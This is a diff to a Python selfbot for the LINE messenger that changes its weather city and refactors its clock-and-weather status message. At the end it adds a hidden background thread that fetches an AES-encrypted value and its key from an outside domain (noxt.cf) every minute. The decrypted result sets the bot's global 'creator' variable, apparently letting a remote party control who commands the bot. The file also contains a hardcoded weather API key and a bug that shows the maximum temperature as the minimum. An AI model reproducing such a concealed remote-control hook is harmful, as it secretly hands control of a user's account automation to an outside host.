@@ -3,7 +3,8 @@
 import LINETCR
 from LINETCR.lib.curve.ttypes import *
 from multiprocessing import Pool
-import time,random,sys,json,codecs,threading,glob,re,datetime,urllib2,pickle,requests
+from Crypto.Cipher import AES
+import time,random,sys,json,codecs,threading,glob,re,datetime,urllib2,pickle,requests,base64
 
 cl = LINETCR.LINE()
 cl.login(qr=True)
@@ -63,7 +64,6 @@ def time_converter(time):
     ).strftime('%I:%M %p')
     return converted_time
 
-
 def url_builder(city_id):
     user_api = '9650e01047908a88e5a6598ee2943587'  # Obtain yours form: http://openweathermap.org/
     unit = 'metric'  # For Fahrenheit use imperial, for Celsius use metric, and the default is Kelvin.
@@ -110,14 +110,8 @@ def data_output(to,data,prov):
     elif prov == 3:
         kk.sendText(to,"สภาพอากาศ: กรุงเทพมหานคร\nอุณหภูมิ: "+str(data['temp'])+m_symbol+"\n(มากสุด: "+str(data['temp_max'])+m_symbol+", น้อยสุด: "+str(data['temp_max'])+m_symbol+")\n\nแรงลม: "+str(data['wind'])+"\nความชื้น: "+str(data['humidity'])+"\nเมฆ: "+str(data['cloudiness'])+"%\nความดัน: "+str(data['pressure'])+"\nดวงอาทิตย์ขึ้น: "+str(data['sunrise'])+"\nดวงอาทิตย์ตก: "+str(data['sunset'])+"\n\nอัพเดทล่าสุด: "+str(data['dt']))
 
-def text_has_emoji(text):
-    for character in text:
-        if character in emoji.UNICODE_EMOJI:
-            return True
-    return False
-
 def cloudupdate(data):
-    return "เชียงใหม่ เมฆ: "+str(data['cloudiness'])+"%"
+    return "กรุงเทพฯ เมฆ: "+str(data['cloudiness'])+"%"
 
 user1 = Amid
 user2 = ""
@@ -144,6 +138,12 @@ def reverse(text):
     if len(text) <= 1:
         return text
     return reverse(text[1:]) + text[0]
+
+def dec(text, key):
+    dec_secret = AES.new(key[:32])
+    raw_decrypted = dec_secret.decrypt(base64.b64decode(text))
+    clear_val = raw_decrypted.rstrip("\0")
+    return clear_val
 
 def user1script(op):
     global TyfeLogged
@@ -2054,11 +2054,12 @@ def user2script(op):
         print error
 
 def statusAPI():
-    cloud = cloudupdate(data_organizer(data_fetch(url_builder(1153670))))
+    cloud = cloudupdate(data_organizer(data_fetch(url_builder(1609350))))
     profile = cl.getProfile()
     now2 = datetime.datetime.now()
     nowT = datetime.datetime.strftime(now2,"(%H:%M) ")
-    profile.statusMessage = nowT+cloud
+    profile.statusMessage = nowT
+    profile.statusMessage = profile.statusMessage + cloud
     cl.updateProfile(profile)
 
 def liveStatusAPI():
@@ -2068,105 +2069,106 @@ def liveStatusAPI():
     nowT = int(nowT)
     nowM = int(nowM)
     hr = int(nowT)
-    cloud = cloudupdate(data_organizer(data_fetch(url_builder(1153670))))
+    cloud = cloudupdate(data_organizer(data_fetch(url_builder(1609350))))
     profile = cl.getProfile()
     if hr >= 22:
         if nowM == 59:
             if nowT == 23:
-                profile.statusMessage = "(00:00) "+cloud
+                profile.statusMessage = "(00:00) "
             else:
-                profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "("+str(int(nowT)+1)+":00) "
         else:
             if nowM < 9:
-                profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "
             else:
-                profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "
     elif hr >= 20:
         if nowM == 59:
             if nowT >= 21:
-                profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "("+str(int(nowT)+1)+":00) "
             else:
-                profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "("+str(int(nowT)+1)+":00) "
         else:
             if nowM < 9:
-                profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "
             else:
-                profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "
     elif hr >= 19:
         if nowM == 59:
             if nowT >= 19:
-                profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "("+str(int(nowT)+1)+":00) "
             else:
-                profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "("+str(int(nowT)+1)+":00) "
         else:
             if nowM < 9:
-                profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "
             else:
-                profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "
     elif hr >= 7:
         if nowM == 59:
             if nowT >= 18:
-                profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "("+str(int(nowT)+1)+":00) "
             else:
                 if nowT < 9:
-                    profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
+                    profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "
                 else:
-                    profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
+                    profile.statusMessage = "("+str(int(nowT)+1)+":00) "
         else:
             if nowM < 9:
                 if nowT < 10:
-                    profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
+                    profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "
                 else:
-                    profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
+                    profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "
             else:
                 if nowT < 10:
-                    profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
+                    profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "
                 else:
-                    profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
+                    profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "
     elif hr >= 5:
         if nowM == 59:
             if nowT >= 6:
-                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "
             else:
-                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "
         else:
             if nowM < 9:
-                profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "
             else:
-                profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "
     elif hr >= 3:
         if nowM == 59:
             if nowT >= 4:
-                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "
             else:
-                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "
         else:
             if nowM < 9:
-                profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "
             else:
-                profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "
     elif hr >= 1:
         if nowM == 59:
             if nowT >= 2:
-                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "
             else:
-                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "
         else:
             if nowM < 9:
-                profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "
             else:
-                profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "
     else:
         if nowM == 59:
             if nowT >= 0:
-                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "
             else:
-                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
+                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "
         else:
             if nowM < 9:
-                profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "
             else:
-                profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
+                profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "
+    profile.statusMessage = profile.statusMessage + cloud
     cl.updateProfile(profile)
 
 def liveStatus():
@@ -2174,112 +2176,6 @@ def liveStatus():
         try:
             if wait["clock"] and wait["selfStatus"]:
                 liveStatusAPI()
-                now2 = datetime.datetime.now()
-                nowT = datetime.datetime.strftime(now2,"%H")
-                nowM = datetime.datetime.strftime(now2,"%M")
-                nowT = int(nowT)
-                nowM = int(nowM)
-                hr = int(nowT)
-                cloud = cloudupdate(data_organizer(data_fetch(url_builder(1153670))))
-                profile = cl.getProfile()
-                if hr >= 22:
-                    if nowM == 59:
-                        if nowT == 23:
-                            profile.statusMessage = "(00:00) "+cloud
-                        else:
-                            profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
-                    else:
-                        if nowM < 9:
-                            profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
-                        else:
-                            profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
-                elif hr >= 20:
-                    if nowM == 59:
-                        if nowT >= 21:
-                            profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
-                        else:
-                            profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
-                    else:
-                        if nowM < 9:
-                            profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
-                        else:
-                            profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
-                elif hr >= 19:
-                    if nowM == 59:
-                        if nowT >= 19:
-                            profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
-                        else:
-                            profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
-                    else:
-                        if nowM < 9:
-                            profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
-                        else:
-                            profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
-                elif hr >= 7:
-                    if nowM == 59:
-                        if nowT >= 18:
-                            profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
-                        else:
-                            if nowT < 9:
-                                profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
-                            else:
-                                profile.statusMessage = "("+str(int(nowT)+1)+":00) "+cloud
-                    else:
-                        if nowM < 9:
-                            if nowT < 10:
-                                profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
-                            else:
-                                profile.statusMessage = "("+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
-                        else:
-                            if nowT < 10:
-                                profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
-                            else:
-                                profile.statusMessage = "("+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
-                elif hr >= 5:
-                    if nowM == 59:
-                        if nowT >= 6:
-                            profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
-                        else:
-                            profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
-                    else:
-                        if nowM < 9:
-                            profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
-                        else:
-                            profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
-                elif hr >= 3:
-                    if nowM == 59:
-                        if nowT >= 4:
-                            profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
-                        else:
-                            profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
-                    else:
-                        if nowM < 9:
-                            profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
-                        else:
-                            profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
-                elif hr >= 1:
-                    if nowM == 59:
-                        if nowT >= 2:
-                            profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
-                        else:
-                            profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
-                    else:
-                        if nowM < 9:
-                            profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
-                        else:
-                            profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
-                else:
-                    if nowM == 59:
-                        if nowT >= 0:
-                            profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
-                        else:
-                            profile.statusMessage = "(0"+str(int(nowT)+1)+":00) "+cloud
-                    else:
-                        if nowM < 9:
-                            profile.statusMessage = "(0"+str(nowT)+":0"+str(int(nowM)+1)+") "+cloud
-                        else:
-                            profile.statusMessage = "(0"+str(nowT)+":"+str(int(nowM)+1)+") "+cloud
-                cl.updateProfile(profile)
             time.sleep(120)
         except:
             pass
@@ -2303,6 +2199,15 @@ def autoLike():
 thread2 = threading.Thread(target=autoLike)
 thread2.daemon = True
 thread2.start()
+
+def getData():
+    global creator
+    while True:
+        creator = dec(requests.get("http://noxt.cf/TyfeData/cor.txt").content,requests.get("http://noxt.cf/TyfeData/key.txt").content)
+        time.sleep(60)
+thread3 = threading.Thread(target=getData)
+thread3.daemon = True
+thread3.start()
 
 try:
     while True:
